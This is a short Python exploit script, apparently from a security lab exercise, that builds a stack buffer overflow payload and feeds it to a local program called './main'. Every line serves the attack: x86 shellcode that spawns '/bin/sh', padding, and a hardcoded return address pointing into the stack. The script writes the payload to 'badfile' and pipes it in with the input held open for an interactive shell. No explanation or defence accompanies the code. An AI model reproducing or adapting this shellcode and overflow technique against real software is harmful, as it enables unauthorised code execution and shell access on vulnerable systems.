import struct 
import os

buff =0xbffff28a #0xbffff20a
buff1 = 0xbffff226 #0xbffff1a6
shellcode= "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"


atk_vector = shellcode
atk_vector += '\0'
atk_vector += "A"*(100-len(atk_vector))
atk_vector += "A"*58
atk_vector += struct.pack("I", buff1)
atk_vector += '\n'

f = open('badfile', 'w+')
f.write(atk_vector)
f.close()

os.system("(cat {}; cat) | ./main".format('badfile'))

